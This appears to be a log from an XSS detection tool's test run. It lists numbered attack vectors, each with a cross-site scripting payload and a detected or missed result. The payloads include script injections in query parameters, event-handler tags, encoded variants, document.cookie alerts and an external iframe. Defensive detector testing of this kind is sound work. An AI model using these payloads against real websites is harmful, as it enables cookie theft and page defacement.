+IndexedDB logs: OriginalPayload: OpenDocument&SUBMI<br/>T.X=0&SUBMIT.Y=0&SUBMIT=Search&FREETEXT=%3Cscript%3Ealert%28%22XSS+by+Prashant%22%29%3C/script%3E
+✅ Detected payload: OpenDocument&SUBMI<br/>T.X=0&SUBMIT.Y=0&SUBMIT=Search&FREETEXT=%3Cscript%3Ealert%28%22XSS+by+Prashant%22%29%3C/script%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64230
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <ruby onmousedown="alert(1)" style=display:block>AnonKryptiQuz</ruby>
+✅ Detected payload: <ruby onmousedown="alert(1)" style=display:block>AnonKryptiQuz</ruby>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64231
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: Field=Title&BigClassName=%3Cscript%3Ealert(%22XSS%22)%3C/script%&lt;br/&gt;3E&SmallClassName=&keyword=XSS&Submit=%CB%D1%CB%F7
+✅ Detected payload: Field=Title&BigClassName=%3Cscript%3Ealert(%22XSS%22)%3C/script%<br/>3E&SmallClassName=&keyword=XSS&Submit=%CB%D1%CB%F7
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64232
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: BATTerm0=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscri<br/>pt%3E&BATAttr0=Use.Any&BATTerm1=&BATOp1=AND&BATAttr1=Use.OrgID&BATMaxRecords=10&submit=Search&BATTar<br/>gets=NRCanWWW+Production5&BATTargetDisplays=NRCan+Web+Pages&search=search&language=en&doValidation=t<br/>rue
+✅ Detected payload: BATTerm0=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscri<br/>pt%3E&BATAttr0=Use.Any&BATTerm1=&BATOp1=AND&BATAttr1=Use.OrgID&BATMaxRecords=10&submit=Search&BATTar<br/>gets=NRCanWWW+Production5&BATTargetDisplays=NRCan+Web+Pages&search=search&language=en&doValidation=t<br/>rue
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64233
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: q=%3C/title%3E%3Cscript%3Ealert(%2Fxss%2F)%3C%2Fscript%3E
+✅ Detected payload: q=%3C/title%3E%3Cscript%3Ealert(%2Fxss%2F)%3C%2Fscript%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64234
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <slot onpointerleave=alert(1)>XSS</slot>
+✅ Detected payload: <slot onpointerleave=alert(1)>XSS</slot>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64235
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <a href="\x09javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+✅ Detected payload: <a href="\x09javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64236
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <a2 onwebkitwillrevealbottom=alert(1)>XSS</a2>
+✅ Detected payload: <a2 onwebkitwillrevealbottom=alert(1)>XSS</a2>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64237
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: mode=simple&query[max]=25&query[mod]=0&qu<br/>ery[start]=0&query[string]=%3CScript%3Ealert(/Jurpie/)%3C/script%3E&query[type]=keyword&sets=g2%2Cg3<br/>&sort_value=relevance&tab_template=general
+✅ Detected payload: mode=simple&query[max]=25&query[mod]=0&qu<br/>ery[start]=0&query[string]=%3CScript%3Ealert(/Jurpie/)%3C/script%3E&query[type]=keyword&sets=g2%2Cg3<br/>&sort_value=relevance&tab_template=general
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64238
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: anno=%22%3E'%3E%3Cscript%3Ealert(document.cookie)%3C/sc<br/>ript%3E
+✅ Detected payload: anno=%22%3E'%3E%3Cscript%3Ealert(document.cookie)%3C/sc<br/>ript%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64239
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <summary onbeforepaste="alert(1)" contenteditable>test</summary>
+✅ Detected payload: <summary onbeforepaste="alert(1)" contenteditable>test</summary>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64240
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: search="><script>alert(navigator.userAgent)</<br/>script>&GROUP=LANG_DE_GBW&HTML-NR=106
+✅ Detected payload: search="><script>alert(navigator.userAgent)</<br/>script>&GROUP=LANG_DE_GBW&HTML-NR=106
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64241
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: search_constraint=0&ic=48_0&search_query='<br/>onmouseover='alert(1);&Find.x=0&Find.y=0&Find=Find
+✅ Detected payload: search_constraint=0&ic=48_0&search_query='<br/>onmouseover='alert(1);&Find.x=0&Find.y=0&Find=Find
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64242
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <p onmouseup="alert(1)">AnonKryptiQuz</p>
+✅ Detected payload: <p onmouseup="alert(1)">AnonKryptiQuz</p>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64243
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
+✅ Detected payload: javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64244
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <button oncontextmenu="alert(1)" style=display:block>test</button>
+✅ Detected payload: <button oncontextmenu="alert(1)" style=display:block>test</button>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64245
+pressed
+Handling alerts
+No logs detected
+IndexedDB logs:
+❌ Missed payload: pt=2&sp=2&ycs=%2BqWEgB7wUAc%3D&qs=06oENya4ZGJbKUjvjwGtnG1Ko75B-snhwwwthcfkoT3DXM0F<br/>Y6cd1F-5bJidqAKuuC0VUE5IKHA1WOvAHXizmWV430v7HrK-4FUPR-QR-BDDBtaUW_PPSQ-Y8SZcFPBk0sHRyd62aKlii8sYOph1<br/>oEZPmVHW48eYBSCT7xs3HoblBJ-GhibYHzs6YKO4w9t8VWDWYVUIG0n9KYr1vmhvQauAOtkNhL3HFDeHnydlKDP6mkYk_IMJe3gN<br/>jfSObfk19oaNzEvekSKNMN,YT0z&vid=1208696519_2X01X847438621&rpt=1&kt=1
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64246
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <embed onmouseenter="alert(1)">AnonKryptiQuz</embed>
+✅ Detected payload: <embed onmouseenter="alert(1)">AnonKryptiQuz</embed>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64247
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: method=%25&cuisine=%25&searchitem=%22%3E%3Cscript<br/>%3Ealert(document.cookie)%3C/script%3E
+✅ Detected payload: method=%25&cuisine=%25&searchitem=%22%3E%3Cscript<br/>%3Ealert(document.cookie)%3C/script%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64248
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <area onmouseover="alert(1)" style=display:block>AnonKryptiQuz</area>
+✅ Detected payload: <area onmouseover="alert(1)" style=display:block>AnonKryptiQuz</area>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64249
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <img src=asdf onerror=alert(document.cookie)>
+✅ Detected payload: <img src=asdf onerror=alert(document.cookie)>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64250
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: mode=check&email=%22%3E%27%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%53%74%&lt;br/&gt;72%69%6E%67%2E%66%72%6F%6D%43%68%61%72%43%6F%64%65%28%36%36%2C%31%32%31%2C%33%32%2C%31%30%37%2C%31%3&lt;br/&gt;1%37%2C%31%31%35%2C%31%31%31%2C%31%30%39%2C%31%30%35%2C%31%31%35%2C%31%31%31%2C%34%36%2C%39%39%2C%31&lt;br/&gt;%31%31%2C%31%30%39%29%29%3C%2F%73%63%72%69%70%74%3E%0A&id=&nickname=&password=&password_chk=
+✅ Detected payload: mode=check&email=%22%3E%27%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%53%74%<br/>72%69%6E%67%2E%66%72%6F%6D%43%68%61%72%43%6F%64%65%28%36%36%2C%31%32%31%2C%33%32%2C%31%30%37%2C%31%3<br/>1%37%2C%31%31%35%2C%31%31%31%2C%31%30%39%2C%31%30%35%2C%31%31%35%2C%31%31%31%2C%34%36%2C%39%39%2C%31<br/>%31%31%2C%31%30%39%29%29%3C%2F%73%63%72%69%70%74%3E%0A&id=&nickname=&password=&password_chk=
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64251
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: q=%253cSCRIPT%253ealert('XSSed%2520by%2520%404irr')%253c%2F<br/>SCRIPT%253e%253cIFRAME%2520SRC%3D%2522javascript%3Aalert('XSSed%2520by%2520%404irr')%3B%2522%253e%25<br/>3c%2FIFRAME%253e&x=9&y=10
+✅ Detected payload: q=%253cSCRIPT%253ealert('XSSed%2520by%2520%404irr')%253c%2F<br/>SCRIPT%253e%253cIFRAME%2520SRC%3D%2522javascript%3Aalert('XSSed%2520by%2520%404irr')%3B%2522%253e%25<br/>3c%2FIFRAME%253e&x=9&y=10
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64252
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <shadow onblur=alert(1) id=x tabindex=1 style=display:block>test</shadow><input value=clickme>
+✅ Detected payload: <shadow onblur=alert(1) id=x tabindex=1 style=display:block>test</shadow><input value=clickme>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64253
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <input3 onkeydown="alert(1)" contenteditable style=display:block>test</input3>
+✅ Detected payload: <input3 onkeydown="alert(1)" contenteditable style=display:block>test</input3>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64254
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: id=16&ref=Musica&busca=%3Cscript%3Ealert%28%22xRoot+OwnEd+yOu<br/>%21%22%29%3C%2Fscript%3E&param1=homebusca&q=%3Cscript%3Ealert%28%22xRoot+OwnEd+yOu%21%22%29%3C%2Fscr<br/>ipt%3E
+✅ Detected payload: id=16&ref=Musica&busca=%3Cscript%3Ealert%28%22xRoot+OwnEd+yOu<br/>%21%22%29%3C%2Fscript%3E&param1=homebusca&q=%3Cscript%3Ealert%28%22xRoot+OwnEd+yOu%21%22%29%3C%2Fscr<br/>ipt%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64255
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <plaintext oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+✅ Detected payload: <plaintext oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64256
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: reqtype=%3Cscript%3Ealert(%22hi%22);%3C/<br/>script%3E
+✅ Detected payload: reqtype=%3Cscript%3Ealert(%22hi%22);%3C/<br/>script%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64257
+pressed
+Handling alerts
+No logs detected
+IndexedDB logs:
+❌ Missed payload: ontransitionrun
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64258
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <image2 onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></image2>
+✅ Detected payload: <image2 onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></image2>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64259
+pressed
+Handling alerts
+No logs detected
+IndexedDB logs:
+❌ Missed payload: <xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64260
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <div draggable="true" contenteditable>drag me</div><li ondragover=alert(1) contenteditable>drop here</li>
+✅ Detected payload: <div draggable="true" contenteditable>drag me</div><li ondragover=alert(1) contenteditable>drop here</li>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64261
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <bdo id=x tabindex=1 onbeforeactivate=alert(1)></bdo>
+✅ Detected payload: <bdo id=x tabindex=1 onbeforeactivate=alert(1)></bdo>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64262
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <template onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</template>
+✅ Detected payload: <template onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</template>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64263
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: title=<script>alert(1);</script>
+✅ Detected payload: title=<script>alert(1);</script>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64264
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <figure onmouseout="alert(1)" style=display:block>test</figure>
+✅ Detected payload: <figure onmouseout="alert(1)" style=display:block>test</figure>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64265
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: domain=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&ext<br/>=com&imageField.x=58&imageField.y=14
+✅ Detected payload: domain=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&ext<br/>=com&imageField.x=58&imageField.y=14
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64266
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: section=mycti&title=<script>alert('CYBER');</scrip<br/>t>
+✅ Detected payload: section=mycti&title=<script>alert('CYBER');</scrip<br/>t>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64267
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: searchText="><script>alert("XSSByDT")</scri<br/>pt>
+✅ Detected payload: searchText="><script>alert("XSSByDT")</scri<br/>pt>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64268
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: search=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscri<br/>pt%3E&Submit=Search
+✅ Detected payload: search=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscri<br/>pt%3E&Submit=Search
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64269
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: fuseaction=content.dsp_cat_content&catid=3e1c3319b0'%22%3E%3C/titl<br/>e%3E%3Cscript%3Ealert(1337)%3C/script%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marqu<br/>ee%3E3eb
+✅ Detected payload: fuseaction=content.dsp_cat_content&catid=3e1c3319b0'%22%3E%3C/titl<br/>e%3E%3Cscript%3Ealert(1337)%3C/script%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marqu<br/>ee%3E3eb
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64270
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <svg/onload=alert(5553)
+✅ Detected payload: <svg/onload=alert(5553)
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64271
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: phrase="><script>alert('CYBER')</script>
+✅ Detected payload: phrase="><script>alert('CYBER')</script>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64272
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: title=Y&keyWord=%CE%DB%C8%BE%27%22%3E%3C%2Ftitle%3E%3Cscript%3Ealer<br/>t%281337%29%3C%2Fscript%3E%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Xylitol%3C%2Fh1%3E%3C%2Fmarquee%3E&Submit=%<br/>CC%E1%BD%BB
+✅ Detected payload: title=Y&keyWord=%CE%DB%C8%BE%27%22%3E%3C%2Ftitle%3E%3Cscript%3Ealer<br/>t%281337%29%3C%2Fscript%3E%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Xylitol%3C%2Fh1%3E%3C%2Fmarquee%3E&Submit=%<br/>CC%E1%BD%BB
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64273
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: keyword=203.216.197.236&start=4&to=23&bbs=c&quot;&quot;&lt;sc&lt;br/&gt;ript&gt;alert(123);&lt;/script&gt;
+✅ Detected payload: keyword=203.216.197.236&start=4&to=23&bbs=c%00%22%22%3Csc<br/>ript%3Ealert(123);%3C/script%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64274
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <select onbeforepaste="alert(1)" contenteditable>AnonKryptiQuz</select>
+✅ Detected payload: <select onbeforepaste="alert(1)" contenteditable>AnonKryptiQuz</select>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64275
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <rtc onbeforepaste="alert(1)" contenteditable>AnonKryptiQuz</rtc>
+✅ Detected payload: <rtc onbeforepaste="alert(1)" contenteditable>AnonKryptiQuz</rtc>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64276
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <small onpointerout=alert(1) style=display:block>AnonKryptiQuz</small>
+✅ Detected payload: <small onpointerout=alert(1) style=display:block>AnonKryptiQuz</small>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64277
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: partnr=w001"><script>alert(1)</script>
+✅ Detected payload: partnr=w001"><script>alert(1)</script>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64278
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: Year=2008&Chamber=Senate&Tab=session&Submenu=5&Search_Type<br/>=General_Search&Search_Mode=Results&Search_Complexity=2&Search_Terms="><script>alert(document.cookie<br/>)</script>><marquee><h1>By+Narcoticxs</h1></marquee>
+✅ Detected payload: Year=2008&Chamber=Senate&Tab=session&Submenu=5&Search_Type<br/>=General_Search&Search_Mode=Results&Search_Complexity=2&Search_Terms="><script>alert(document.cookie<br/>)</script>><marquee><h1>By+Narcoticxs</h1></marquee>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64279
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: id=433}%22%3CIMG%20src=%27<br/>http://nemesis.te-home.net%27%3E%3CBR%3E%3CBR%3E%3CIFRAME%20width=%27230%%27%20height=%27600px%27%20<br/>src=%27http://nemesis.te-home.net%27%3E
+✅ Detected payload: id=433}%22%3CIMG%20src=%27<br/>http://nemesis.te-home.net%27%3E%3CBR%3E%3CBR%3E%3CIFRAME%20width=%27230%%27%20height=%27600px%27%20<br/>src=%27http://nemesis.te-home.net%27%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64280
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: cid="><script>alert(document.cookie)</script>><mar<br/>quee><h1>By+Narcoticxs</h1></marquee>
+✅ Detected payload: cid="><script>alert(document.cookie)</script>><mar<br/>quee><h1>By+Narcoticxs</h1></marquee>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64281
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <q onpointerout=alert(1)>XSS</q>
+✅ Detected payload: <q onpointerout=alert(1)>XSS</q>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64282
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <ol onkeypress="alert(1)" contenteditable style=display:block>test</ol>
+✅ Detected payload: <ol onkeypress="alert(1)" contenteditable style=display:block>test</ol>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64283
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: query="><script>ale<br/>rt(String.fromCharCode(88,83,83))</script>
+✅ Detected payload: query="><script>ale<br/>rt(String.fromCharCode(88,83,83))</script>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64284
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <datalist onmousedown="alert(1)">AnonKryptiQuz</datalist>
+✅ Detected payload: <datalist onmousedown="alert(1)">AnonKryptiQuz</datalist>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64285
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: Submit=DailyDeals&LayoutView="><img src=x<br/>onerror=alert(1);>
+✅ Detected payload: Submit=DailyDeals&LayoutView="><img src=x<br/>onerror=alert(1);>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64286
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <input type=image src=validimage.png onload=alert(1)>
+✅ Detected payload: <input type=image src=validimage.png onload=alert(1)>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64287
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: language=wawa'><script>alert(123)</script>
+✅ Detected payload: language=wawa'><script>alert(123)</script>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64288
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: q=%3Cscript%3Ealert('cueballr')%3C/script%3E
+✅ Detected payload: q=%3Cscript%3Ealert('cueballr')%3C/script%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64289
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <col oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>
+✅ Detected payload: <col oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64290
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <style>@keyframes slidein {}</style><svg style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></svg>
+✅ Detected payload: <style>@keyframes slidein {}</style><svg style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></svg>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64291
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <button popovertarget=x>Click me</button><input onbeforetoggle=alert(1) popover id=x>XSS</input>
+✅ Detected payload: <button popovertarget=x>Click me</button><input onbeforetoggle=alert(1) popover id=x>XSS</input>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64292
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: ATTCH1=111-222-1933email@address.tst&TEMPLATE=>"><ScRiPt%20%<br/>0a%0d>alert(/XSS%20By%20TurKPoweR/)%3B</ScRiPt><h1>XSS%20By%20TurKPoweR</h1></marquee>
+✅ Detected payload: ATTCH1=111-222-1933email@address.tst&TEMPLATE=>"><ScRiPt%20%<br/>0a%0d>alert(/XSS%20By%20TurKPoweR/)%3B</ScRiPt><h1>XSS%20By%20TurKPoweR</h1></marquee>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64293
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <summary onmousedown="alert(1)" style=display:block>test</summary>
+✅ Detected payload: <summary onmousedown="alert(1)" style=display:block>test</summary>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64294
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: letra="><script>alert(/xss%20<br/>by%20n-bl4x/)</script>
+✅ Detected payload: letra="><script>alert(/xss%20<br/>by%20n-bl4x/)</script>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64295
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: template_id=&partner_id=2&mscssid=JX1Q3SDRSWA<br/>88KLRMNH25EEW852WBWA9&dept_id_busca=0&spec=<script>alert("Ciashop search system g0t<br/>XSSED")</script>&Submit.x=0&Submit.y=0&Submit=OK
+✅ Detected payload: template_id=&partner_id=2&mscssid=JX1Q3SDRSWA<br/>88KLRMNH25EEW852WBWA9&dept_id_busca=0&spec=<script>alert("Ciashop search system g0t<br/>XSSED")</script>&Submit.x=0&Submit.y=0&Submit=OK
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64296
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: go=results&search=%22%3E%3Cscript%3Ealert(1)%3C/script%3E&Submi<br/>t=Search
+✅ Detected payload: go=results&search=%22%3E%3Cscript%3Ealert(1)%3C/script%3E&Submi<br/>t=Search
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64297
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: CID=%22%3C/script%3E%3Cscript%3Ealert(%22hehe%20:%20)CrypTic%22<br/>)%3C/script%3E
+✅ Detected payload: CID=%22%3C/script%3E%3Cscript%3Ealert(%22hehe%20:%20)CrypTic%22<br/>)%3C/script%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64298
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: option=com_zoom&Itemid=32&page="><script>alert("XssedByCicosz"<br/>)</script>
+✅ Detected payload: option=com_zoom&Itemid=32&page="><script>alert("XssedByCicosz"<br/>)</script>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64299
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: ref=><br><script>alert(document.cookie);</script
+✅ Detected payload: ref=><br><script>alert(document.cookie);</script
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64300
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: `"'><img src=xxx:x \x0Donerror=javascript:alert(3902)>
+✅ Detected payload: `"'><img src=xxx:x \x0Donerror=javascript:alert(3902)>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64301
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: search_phrase=%27%22%3E%3Cscript%3Ealert%28document.c<br/>ookie%29%3B%3C%2Fscript%3E&category=
+✅ Detected payload: search_phrase=%27%22%3E%3Cscript%3Ealert%28document.c<br/>ookie%29%3B%3C%2Fscript%3E&category=
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64302
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <template draggable="true" ondragleave="alert(1)" style=display:block>test</template>
+✅ Detected payload: <template draggable="true" ondragleave="alert(1)" style=display:block>test</template>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64303
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <abbr onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</abbr><input value=clickme>
+✅ Detected payload: <abbr onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</abbr><input value=clickme>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64304
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <ol onwebkitmouseforcedown=alert(1)>XSS</ol>
+✅ Detected payload: <ol onwebkitmouseforcedown=alert(1)>XSS</ol>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64305
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <div draggable="true" contenteditable>drag me</div><a ondrop=alert(1) contenteditable>drop here</a>
+✅ Detected payload: <div draggable="true" contenteditable>drag me</div><a ondrop=alert(1) contenteditable>drop here</a>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64306
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: searchText=%22%3E%3Cscript%3Ealert(%22Xss%20By%20THE_MIL<br/>LER%22)%20%3C/script%3E%3Cmarquee%3EXss%20By%20THE_MILLER%3C/marquee%3E
+✅ Detected payload: searchText=%22%3E%3Cscript%3Ealert(%22Xss%20By%20THE_MIL<br/>LER%22)%20%3C/script%3E%3Cmarquee%3EXss%20By%20THE_MILLER%3C/marquee%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64307
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: q=%3Cscript%3Ealert(%22iBlaze%22)%3C%2Fscript%3E&z=Newbur<br/>yport%2C+MA
+✅ Detected payload: q=%3Cscript%3Ealert(%22iBlaze%22)%3C%2Fscript%3E&z=Newbur<br/>yport%2C+MA
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64308
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <multicol oncontextmenu="alert(1)">AnonKryptiQuz</multicol>
+✅ Detected payload: <multicol oncontextmenu="alert(1)">AnonKryptiQuz</multicol>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64309
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <style>@keyframes slidein {}</style><frame style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onwebkitanimationiteration="alert(1)"></frame>
+✅ Detected payload: <style>@keyframes slidein {}</style><frame style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onwebkitanimationiteration="alert(1)"></frame>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64310
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: go='<script>alert('XSS')</script>
+✅ Detected payload: go='<script>alert('XSS')</script>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64311
+pressed
+Handling alerts
